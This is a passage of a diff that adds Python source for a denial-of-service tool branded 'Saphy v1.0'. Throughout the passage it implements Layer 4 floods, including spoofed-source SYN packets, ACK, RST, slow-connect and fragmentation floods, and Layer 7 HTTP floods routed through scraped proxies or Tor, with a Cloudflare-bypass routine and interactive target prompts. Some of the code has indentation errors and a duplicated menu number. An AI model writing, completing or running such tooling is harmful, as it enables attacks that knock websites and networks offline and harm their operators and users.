+            except:
+                pass
+
+    def tcp_ack_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.01)
+                sock.connect_ex((self.target_ip, self.target_port))
+                sock.send(b'\x10\x02' + random._urandom(14))
+                sock.close()
+            except:
+                pass
+
+    def raw_syn_flood(self):
+        while time.time() < self.end_time:
+            ip = IP(src=fake_ip(), dst=self.target_ip)
+            tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags='S')
+            packet = ip / tcp
+            send(packet, verbose=False)
+    
+
+    def protocol_blender_flood(self):
+        while time.time() < self.end_time:
+            ip = IP(src=fake_ip(), dst=self.target_ip)
+            proto = random.choice(['tcp', 'udp', 'icmp'])
+        if proto == 'tcp':
+            layer = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags='S')
+        elif proto == 'udp':
+            layer = UDP(sport=random.randint(1024,65535), dport=self.target_port)
+        else:
+            layer = ICMP()
+        packet = ip / layer
+        send(packet, verbose=False)
+
+    def slow_connect_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(4)
+                sock.connect((self.target_ip, self.target_port))
+                sock.send(b"GET / HTTP/1.1\r\n")
+                time.sleep(random.uniform(0.5, 1.5))
+            except:
+                pass
+
+    def fragmentation_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.target_ip, self.target_port))
+                for _ in range(20):  # Fragmented small chunks
+                    sock.send(random._urandom(4))
+                    time.sleep(0.05)
+                sock.close()
+            except:
+                pass
+
+    def tcp_rst_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.01)
+                sock.connect_ex((self.target_ip, self.target_port))
+                sock.send(b'\x00\x02' + random._urandom(14))
+                sock.close()
+            except:
+                pass
+
+    def hybrid_l4_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.01)
+                sock.connect_ex((self.target_ip, self.target_port))
+                flags = random.choice([b'\x02', b'\x10', b'\x04', b'\x08', b'\x01'])
+                sock.send(flags + random._urandom(15))
+                sock.close()
+            except:
+                pass
+
+    def start_attack(self, mode):
+        attack_map = {
+            "udp-flood": self.udp_flood,
+            "tcp-syn-flood": self.tcp_syn_flood,
+            "tcp-ack-flood": self.tcp_ack_flood,
+            "syn-spoof": self.raw_syn_flood,
+            "tcp-rst-flood": self.tcp_rst_flood,
+            "hybrid-l4": self.hybrid_l4_flood,
+            "proto-blender": self.protocol_blender_flood,
+            "slow-connect": self.slow_connect_flood,
+            "fragment-flood": self.fragmentation_flood
+        }
+        attack_func = attack_map.get(mode)
+        if not attack_func:
+            print(f"{Fore.RED}[!] Invalid attack mode.")
+            return
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=attack_func, daemon=True)
+            t.start()
+            threads.append(t)
+        for t in threads:
+            t.join()
+
+# Main
+async def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"""
+{Fore.LIGHTYELLOW_EX}
+███████╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗    
+██╔════╝██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝    
+███████╗███████║██████╔╝███████║ ╚████╔╝     
+╚════██║██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝      
+███████║██║  ██║██║     ██║  ██║   ██║       
+╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝       
+{Style.RESET_ALL}
+         {Fore.LIGHTYELLOW_EX}Saphy{Style.RESET_ALL} Saphy v1.0 - Firepower Edition
+{Fore.LIGHTCYAN_EX}  Developed By: Lynss
+{Style.RESET_ALL}
+    """)
+    print(f"{Fore.LIGHTGREEN_EX}Choose Layer: ")
+    print(f"{Fore.YELLOW}1. Layer 7 (Website)")
+    print(f"{Fore.YELLOW}2. Layer 4 (Network/IP)")
+    layer_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > "))
+
+    if layer_choice == 1:
+        url = input(f"{Fore.LIGHTGREEN_EX}Target URL > ")
+        info = analyze_target(url)
+        duration = int(input(f"{Fore.LIGHTGREEN_EX}Attack Duration (seconds) > "))
+        threads = int(input(f"{Fore.LIGHTGREEN_EX}Threads > "))
+
+        attack_modes = {
+            "http-flood": {"method": "GET"},
+            "random-uri": {"method": "GET", "uri_random": True},
+            "head": {"method": "HEAD"},
+            "post": {"method": "POST"},
+            "random-method": {"random_method": True, "uri_random": True},
+            "cookie": {"method": "GET", "header_mode": "cookie"},
+            "referer": {"method": "GET", "header_mode": "referer"},
+            "useragent": {"method": "GET"},
+            "cache-bypass": {"method": "GET", "header_mode": "cache", "uri_random": True}
+        }
+
+        # Smart Suggestion
+        suggested_modes = suggest_attack_modes(info)
+
+        print(f"{Fore.LIGHTGREEN_EX}Select Attack Mode:")
+        for i, mode in enumerate(attack_modes.keys(), 1):
+            hint = f"[suggested]" if mode in suggested_modes else ""
+            print(f"{Fore.YELLOW}{i}. {mode} {Fore.LIGHTMAGENTA_EX}{hint}")
+
+        mode_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > ")) - 1
+        selected_mode = list(attack_modes.keys())[mode_choice]
+
+        user_agents = load_user_agents()
+        
+        http_proxies, socks4_proxies, socks5_proxies = categorize_proxies(scrape_proxies())
+        selected_type = "http"  
+
+        if selected_type == "http":
+            proxy_list = http_proxies
+        elif selected_type == "socks4":
+            proxy_list = socks4_proxies
+        elif selected_type == "socks5":
+            proxy_list = socks5_proxies
+        elif selected_type == "tor":
+            proxy_list = ["127.0.0.1:9050"] * 50  
+            selected_type = "socks5"
+
+        print(f"{Fore.LIGHTCYAN_EX}Proxies being used:")
+        for proxy in proxy_list[:500]:  
+            ip = proxy.split(":")[0]
+            location = geo_ip(ip)
+            print(f"{proxy} -> {location}")
+
+        threading.Thread(target=stats_dashboard, args=(url, duration), daemon=True).start()
+
+        if info['cloudflare']:
+            threads_list = [threading.Thread(target=cloudflare_bypass, args=(url, duration, user_agents), daemon=True) for _ in range(threads)]
+            for t in threads_list: t.start()
+            for t in threads_list: t.join()
+        else:
+            config = attack_modes[selected_mode]
+            tasks = []
+        for proxy in proxy_list:
+            tasks.append(generic_attack(
+                url=url,
+                duration=duration,
+                user_agents=user_agents,
+                proxy=proxy,
+                proxy_type=selected_type,
+                method=config.get("method", "GET"),
+                uri_random=config.get("uri_random", False),
+                data=config.get("data", None),
+                header_mode=config.get("header_mode", "basic"),
+                random_method=config.get("random_method", False)
+            ))
+
+        await asyncio.gather(*tasks)
+
+    print(f"\n{Fore.GREEN}[+] Attack finished! Total: {counters['total']}, Success: {counters['success']}, Errors: {counters['error']}")
+
+    if layer_choice == 2:
+        print(f"{Fore.LIGHTGREEN_EX}{'='*40}")
+        print(f"{Fore.LIGHTGREEN_EX}        Layer 4 Attack Dashboard")
+        print(f"{Fore.LIGHTGREEN_EX}{'='*40}")
+
+        target_ip = input(f"{Fore.LIGHTGREEN_EX}Target IP > ")
+        target_port = int(input(f"{Fore.LIGHTGREEN_EX}Target Port > "))
+        duration = int(input(f"{Fore.LIGHTGREEN_EX}Attack Duration (seconds) > "))
+        threads = int(input(f"{Fore.LIGHTGREEN_EX}Threads > "))
+
+        print(f"{Fore.LIGHTGREEN_EX}Select Layer 4 Attack Mode:")
+        print(f"{Fore.YELLOW}1. UDP Flood")
+        print(f"{Fore.YELLOW}2. TCP SYN Flood")
+        print(f"{Fore.YELLOW}3. TCP ACK Flood")
+        print(f"{Fore.YELLOW}4. SYN Spoof")
+        print(f"{Fore.YELLOW}5. TCP RST Flood")
+        print(f"{Fore.YELLOW}6. Hybrid L4 Flood")
+        print(f"{Fore.YELLOW}7. PROTO-BLENDER Flood")
+        print(f"{Fore.YELLOW}8. SLOW-CONNECT Flood")
+        print(f"{Fore.YELLOW}8. FRAGMENTED Flood")
+        mode_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > "))
+
+        mode_map = {
+            1: "udp-flood",
+            2: "tcp-syn-flood",
+            3: "tcp-ack-flood",
+            4: "syn-spoof",
+            5: "tcp-rst-flood",
+            6: "hybrid-l4",
+            7: "proto-blender",
+            8: "slow-connect",
+            9: "fragment-flood"
+        }
+
+        mode = mode_map.get(mode_choice)
+
+        if mode:
+            # Dashboard summary
+            print(f"\n{Fore.LIGHTCYAN_EX}{'-'*40}")
+            print(f"{Fore.CYAN}Target IP      : {target_ip}")
+            print(f"{Fore.CYAN}Target Port    : {target_port}")
+            print(f"{Fore.CYAN}Duration       : {duration} seconds")
+            print(f"{Fore.CYAN}Threads        : {threads}")
+            print(f"{Fore.CYAN}Attack Mode    : {mode}")
+            print(f"{Fore.LIGHTCYAN_EX}{'-'*40}")
+
+            confirm = input(f"{Fore.LIGHTGREEN_EX}Confirm and launch attack? (Y/n) > ").strip().lower()
+            if confirm == 'y' or confirm == '':
+                attack = Layer4Attack(target_ip, target_port, duration, threads)
+                attack.start_attack(mode)
+            else:
+                print(f"{Fore.LIGHTYELLOW_EX}Attack canceled by user.")
+        else:
+            print(f"{Fore.RED}[!] Invalid choice!")
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
